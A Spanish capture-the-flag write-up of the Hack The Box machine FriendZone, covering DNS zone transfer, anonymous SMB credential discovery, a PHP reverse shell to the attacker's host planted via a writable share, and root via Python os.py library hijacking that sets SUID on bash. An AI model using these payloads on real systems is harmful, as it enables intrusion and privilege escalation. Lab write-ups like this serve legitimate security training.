---
layout: single
title: FriendZone - Hack The Box
excerpt: "Esta maquina me gusto bastante porque los ataques de transferencia de zona son mis favoritos. Despues de destriparos la maquina voy a proceder a explicarosla.
FriendZone es una maquina Linux con una dificultad en Hack de Box de Easy."
date: 2021-9-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-friendzone/friendzone_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
   - hackthebox
   - infosec
tags:
   - linux
   - virtual hosting
   - domain zone transfer
   - friendzone
   - smb
   - lfi
   - rce
   - cron
   - library hijacking
---

![](/assets/images/htb-writeup-friendzone/friendzone_logo.png)

# Reconocimiento
Esta maquina me gusto bastante porque los ataques de transferencia de zona son mis favoritos. Despues de destriparos la maquina voy a a proceder a explicarosla. FriendZone es una maquina Linux con una dificultad en Hack de Box Easy

Primero vamos a realizar un reconocimiento de puertos por el protocolo **TCP**, y el output vamos a meterlo en el archivo `allPorts`, por si acaso se nos olvida tener siempre la informacion apuntada.

```bash

h3g0c1v@kali:~/htb/friendzone$ nmap -p- --open -T5 -v -n 10.10.10.123 -oG allPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 19:44 CEST
Initiating Ping Scan at 19:44
Scanning 10.10.10.123 [4 ports]
Completed Ping Scan at 19:44, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:44
Scanning 10.10.10.123 [65535 ports]
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 21/tcp on 10.10.10.123
Discovered open port 22/tcp on 10.10.10.123
Completed SYN Stealth Scan at 19:45, 11.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.123
Host is up (0.031s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

```

Despues de esto extraemos los puertos con la utilidad que tengo previamente definida en la `.zshrc`. Dicha herramienta esta creada por s4vitar.


```bash

h3g0c1v@kali:~/htb/friendzone$ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.123
   5   │     [*] Open ports: 21,22,53,80,139,443,445
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 

```

Ahora detectaremos la **versión** y **servicio** que corren bajo los puertos abiertos, y el output lo meteremos en el archivo `targeted`.

```bash
h3g0c1v@kali:~/htb/friendzone$ nmap -sC -sV -p21,22,53,80,139,443,445 10.10.10.123 -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 20:03 CEST
Nmap scan report for friendzoneportal.red (10.10.10.123)
Host is up (0.031s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Watching you !
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -51m49s, deviation: 1h43m55s, median: 8m10s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-09-12T21:11:31+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-12T18:11:31
|_  start_date: N/A

```
Antes que nada vamos a ver que nos dice el `whatweb` para saber que es ese puerto 80 y 443 que estan abiertos

```bash
h3g0c1v@kali:~/htb/friendzone$ whatweb http://10.10.10.123
http://10.10.10.123 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]

```

```bash
h3g0c1v@kali:~/htb/friendzone$ whatweb https://10.10.10.123
https://10.10.10.123 [404 Not Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[404 Not Found]


```

Y vemos que en el puerto 80, hay un dominio que parece interesante, asi que lo vamos a introducir en el `/etc/hosts` 

```bash

       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   h3g0c1v
   3   │ 
   4   │ 10.10.10.123    friendzoneportal.red
   5   │ 
   6   │ # The following lines are desirable for IPv6 capable hosts
   7   │ ::1     localhost ip6-localhost ip6-loopback
   8   │ ff02::1 ip6-allnodes
   9   │ ff02::2 ip6-allrouters

```

# Ataque de Transferencia de Zona

Cuando entramos en el dominio vemos lo siguiente.

![](/assets/images/htb-writeup-friendzone/good.png)

Como veo nos estan troleando un poquito ahora van a ver.

He visto un dominio, entonces se me ocurre hacer un **ataque de transferencia de zona** con al utilidad **dig** utilizando el parametro axfr

```bash

h3g0c1v@kali:~/htb/friendzone$ dig @10.10.10.123 friendzone.red axfr

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.123 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 32 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: dom sep 12 20:55:53 CEST 2021
;; XFR size: 8 records (messages 1, bytes 289)

```

Ahora si que se pone un poco mas interesante. Descubrimos nuevos dominios, los cuales introducimos en el archivo `/etc/hosts`

```bash

       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   h3g0c1v
   3   │ 
   4   │ 10.10.10.123    friendzoneportal.red administrator1.friendzone.red. hr.friendzone.red. uploads.friendzone.red.
   5   │ 
   6   │ # The following lines are desirable for IPv6 capable hosts
   7   │ ::1     localhost ip6-localhost ip6-loopback
   8   │ ff02::1 ip6-allnodes
   9   │ ff02::2 ip6-allrouters

```

Me huele muy bien ese administrator1.friendzone.red. asi que lo vamos a abrir.
Nos encontramos con un **login**, asi que abra que buscar credenciales validas.

![](/assets/images/htb-writeup-friendzone/login.png)

# Samba

Bien, vamos a probar con Samba. Primero vamos a ver los recursos compartidos a nivel de red

```bash
h3g0c1v@kali:~/htb/friendzone$ smbclient -L 10.10.10.123 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```
Y bueno vemos que hay unos cuantos pero tenemos que saber cuales son los que nos podemos meter, asi que vamos a ver los permisos que tiene cada uno

```bash

h3g0c1v@kali:~/htb/friendzone$ smbmap -H 10.10.10.123      
[+] Guest session   	IP: 10.10.10.123:445	Name: friendzoneportal.red                              
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	Files                                             	NO ACCESS	FriendZone Samba Server Files /etc/Files
	general                                           	READ ONLY	FriendZone Samba Server Files
	Development                                       	READ, WRITE	FriendZone Samba Server Files
	IPC$                                              	NO ACCESS	IPC Service (FriendZone server (Samba, Ubuntu))


```
Vemos que en Files la ruta en la que esta almacenado los archivos es `/etc/Files`, entonces intuyo que los demas recursos seran igual.

Vale vemos que a los recursos compartidos **general** y **Development** podemos entrar asi que vamos a ver que tienen.

```bash

h3g0c1v@kali:~/htb/friendzone$ smbclient //10.10.10.123/general -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:10:51 2019
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

		9221460 blocks of size 1024. 6460268 blocks available



```

Y vemos que en el recurso **Development** no hay nada pero en **general** nos encontramos con un archivo llamado **creds** asi que vamos a extraerlo a nuestro equipo a ver que es.

```bash

h3g0c1v@kali:~/htb/friendzone$ cat creds.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: creds.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ creds for the admin THING:
   2   │ 
   3   │ admin:WORKWORKHhallelujah@#
   4   │ 


```

¡Genial! Hemos encontrado estas credenciales, vamos a ver si son validas para el login encontrado anteriormente.

![](/assets/images/htb-writeup-friendzone/dashboard.png)

¡Y si! Han sido validas las credenciales y nos aparece una pantalla en la que nos dice que visitemos `/dashboard.php` asi que le haremos caso.
![](/assets/images/htb-writeup-friendzone/timeout.png)

Vemos que hay un comando que podemos ejecutar en la web, por lo que yo le seguire haciendo caso.
![](/assets/images/htb-writeup-friendzone/haha.png)

Muy bien parece que se nos siguen riendo, pero no pasa nada que ya veran. 

Probamos distintas inyecciones de comandos en la url de la pagina pero no funcionan asi que lo unico que creo que puede funcionar es una revershell en el recurso compartido *Development*, que recordemos que se tenia permisos de **lectura** y **escritura**.

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/443 0>&1'");
?>

```

Perfecto, una vez metido nuestro archivo en el recurso compartido `//10.10.10.123/Development` procedemos a intentar **ejecutarlo**

```bash

h3g0c1v@kali:~/htb/friendzone$ smbclient //10.10.10.123/Development -N
Try "help" to get a list of possible commands.
smb: \> put h3g0shell.php 
putting file h3g0shell.php as \h3g0shell.php (0,6 kb/s) (average 0,6 kb/s)
smb: \> dir
  .                                   D        0  Sun Sep 12 23:47:58 2021
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  h3g0shell.php                       A       71  Sun Sep 12 23:47:58 2021

		9221460 blocks of size 1024. 6460252 blocks available


```

# Ganamos Acceso a la Maquina

Ahora nos dirijimos a la url en la que se encuentra nuestro archivo malicioso poniendonos en escucha por el puerto `443` para conseguir el acceso a la maquina.

![](/assets/images/htb-writeup-friendzone/acceso.png)

Y genial!! Ya estamos dentro de la maquina victima ahora podemos visualizar la **flag** `user.txt`

```bash
h3g0c1v@kali:~/htb/friendzone$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.123] 42408
bash: cannot set terminal process group (479): Inappropriate ioctl for device
bash: no job control in this shell

```

Primero hacemos un tratamiento de la tty para poder navegar mejor por la terminal y le indicamos como tipo de terminal una xterm

```bash
www-data@FriendZone:/home$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@FriendZone:/home$ ^Z
zsh: suspended  nc -nlvp 443

h3g0c1v@kali:~/htb/friendzone$ stty raw -echo; fg                     
[2]  - continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm

```

Ahora exportamos la variable **TERM** y la variable **SHELL**


```bash
www-data@FriendZone:/home$ export TERM=xterm
www-data@FriendZone:/home$ export SHELL=bash

```

# Visualizamos la user.txt

Muy bien ahora que tenemos una terminal totalmente interactiva, nos dirijimos al directorio `/home/friend/` procedemos a visualizar la **flag** del **user**

```bash
www-data@FriendZone:/$ cd /home/friend/
www-data@FriendZone:/home/friend$ ls 
user.txt
www-data@FriendZone:/home/friend$ cat user.txt 
a9ed20acecd6c5b6b52f474e15ae9a11

```

# Privilate Escalation

Ahora que tenemos la **flag** del **user** procederemos a escalar privilegios, para ello nos crearemos una script en bash para poder ver si hay alguna tarea **CRON** que nos podamos aprovechar.

```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n[!] Saliendo...\n"
        exit 1
}

trap ctrl_c INT

old_process=$(ps -eo command)

while true; do
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "command|procmon"
        old_process=$new_process
done

```

Le damos los permisos necesarios para su ejecucion y vemos que aparece una tarea **CRON** interesante.

```bash
www-data@FriendZone:/tmp$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c /opt/server_admin/reporter.py
> /usr/bin/python /opt/server_admin/reporter.py
< /usr/sbin/CRON -f
< /bin/sh -c /opt/server_admin/reporter.py
< /usr/bin/python /opt/server_admin/reporter.py

```
Vamos a ver que contiene esa tarea **CRON**

```python
www-data@FriendZone:/tmp$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer


```

Muy bien ahora se me ocurre viendo que busca ejecutar el **comando** `os` a nivel de sistema puedo probar a realizar un `Library Hijacking`.
Entonces editaremos el archivo `os.py` que se encuentra en la ruta `/usr/lib/python2.7/os.py` y añadiremos al final lo siguiente.

```bash
system("chmod 4755 /bin/bash")

```

Ahora esperaremos hasta que la tarea `CRON` se ejecute y nos ponga el permiso **SUID** a la `/bin/bash`.

```bash
www-data@FriendZone:/tmp$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash

```

Perfecto se ha ejecutado la tarea `CRON` y nos ha funcionado nuestro comando. Ahora ejecutamos el comando `bash -p` para obtener el root.

```bash
www-data@FriendZone:/tmp$ bash -p
bash-4.4# whoami
root

```

Y genial! Hemos **comprometido** la maquina y **escalado privilegios**.
Ahora podemos ir al directorio `/root` y visualizar la **flag** de **root**

```bash
bash-4.4# cat root.txt 
b0e6c60b82cf96e9855ac1656a9e90c7

```
